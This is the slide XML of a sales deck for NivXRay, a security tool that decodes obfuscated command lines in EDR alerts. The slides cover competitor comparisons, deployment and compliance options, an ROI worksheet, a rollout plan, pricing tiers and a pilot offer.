              <a:t>Competitive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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Where NivXRay sits vs alternatives.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CyberChef            ○ Manual toolkit · No verdict · No MITRE · No integration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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VirusTotal           ○ Hash lookup · Doesn't decode obfuscation first</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Any.Run / Hybrid     ○ Dynamic sandbox · Detonation only (complementary to us)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Joe Sandbox          ○ Dynamic sandbox · Same as above</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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PowerDecode          ○ PowerShell only · No CMD/JS/VBS · No verdict</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Speakeasy / Unicorn  ○ Binary emulation · Not commandlines</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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LLM-based decoders   ○ Non-deterministic · Cloud-dependent · Unauditable · Costs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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                    ○ Wrong tool for regulated industries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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NivXRay's moat: Deterministic + commandline-first + analyst-ready + enterprise-integrated.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Compliance &amp; Airgap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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Deployment options for every buyer.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SaaS (nivxray.nivxforge.com)   ○ Fastest onboarding · Emergent-hosted · Auto-updated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Self-Hosted (K8s / Docker)     ○ Full airgap capability · Deterministic engine works offline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Airgap Enterprise              ○ Zero outbound calls · CJIS / HIPAA / ITAR compatible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Hybrid                         ○ Self-hosted engine + SaaS TI feeds (best of both)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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Compliance path:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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   ○ SOC 2 Type II    ○ Roadmap Q3 2026</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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   ○ ISO 27001        ○ Roadmap Q4 2026</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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   ○ FedRAMP Moderate ○ Airgap variant · Q2 2027</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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   ○ CJIS / HIPAA / ITAR ○ Airgap-compatible TODAY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>•    ○ GDPR             ○ Compliant · no PII processed in core engine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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>ROI Worksheet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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Fill in your numbers → see the payback.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387" y="2468880"/>
            <a:ext cx="2743200" cy="18288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7E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387" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a: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387" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>obfuscated EDR alerts / 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92627" y="2468880"/>
            <a:ext cx="2743200" cy="18288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7E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92627" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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2627" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>current avg decode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2468880"/>
            <a:ext cx="2743200" cy="18288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7E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5867" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>30 sec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5867" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>NivXRay avg decode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19107" y="2468880"/>
            <a:ext cx="2743200" cy="18288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7E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19107" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>$150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19107" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>fully-loaded analyst hourly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Time saved per day  =  100 × (30 min − 30 sec)  =  ~49 analyst-hours/day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Weekly reclaimed    =  245 analyst-hours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Annual $ recovered  =  ~$1.9M in reclaimed analyst time (at $150/hr fully-loaded)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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Even if these numbers halve, ROI on a $30k/yr Business tier is 30x+.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Rollout Plan · 30 / 60 /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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>From pilot to full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Days 0–30 · PILOT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   → Deploy (SaaS or self-hosted)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   → Connect 1 EDR (CrowdStrike / Defender webhook)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   → Manual export to SIEM · Baseline on 20 real alerts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   → Success: ≥90% chain-complete under 30s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Days 31–60 · SIEM INTEGRATION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   → Wire SIEM push (Splunk HEC / Sentinel / Chronicle)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   → Enrich 3–5 correlation rules with decoded IOCs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   → Success: SIEM rules firing on decoded IOCs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Days 61–90 · ITSM + SOAR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   → Wire ServiceNow SIR / Jira SM auto-ticketing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   → Wire SOAR playbook triggers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>•    → Success: 80% malware alerts auto-ticketed with pre-decoded evidence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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Commercial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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Right-sized for teams and enterprises.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972800" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111A2E"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="7E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EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Community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96596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EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1 user · 100 alerts/mo · SaaS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92024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B82E"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Free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10972800" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111A2E"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="7E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EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a: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8036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EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>5 users · 2K alerts/mo · SaaS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283464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B82E"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>$499/mo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10972800" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111A2E"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="7E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49039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EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Business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79476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EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>25 users · 20K alerts/mo · SaaS +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3749039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B82E"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>$2,499/mo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72000"/>
            <a:ext cx="10972800" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111A2E"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="7E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EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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0916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EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Unlimited · SaaS or Self-hosted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466344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B82E"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Contact sales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86400"/>
            <a:ext cx="10972800" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111A2E"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="7E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77840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EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Airgap Enterprise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62356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6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Unlimited · Self-hosted only + on-prem SLA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557784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B82E"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Contact sales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EE3C9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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Two-week pilot. Real alerts. Measurable outcome.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600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 1.  Sign a 2-week pilot NDA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 2.  Forward 20 obfuscated EDR alerts from your last incident (redacted OK)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 3.  We deploy NivXRay in your preferred mode (SaaS / self-hosted trial)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 4.  We wire 1 EDR + 1 SIEM connector</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 5.  You measure: time-to-decode + IOC recovery rate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 6.  If NivXRay saves &gt;10 analyst-hours/week → we sign a Business tier</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Contact:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>•    → nivxray.nivxforge.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>•    → admin@nivxray.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>•    → LinkedIn: NivXRay MCIP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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>"Give your analysts their time back."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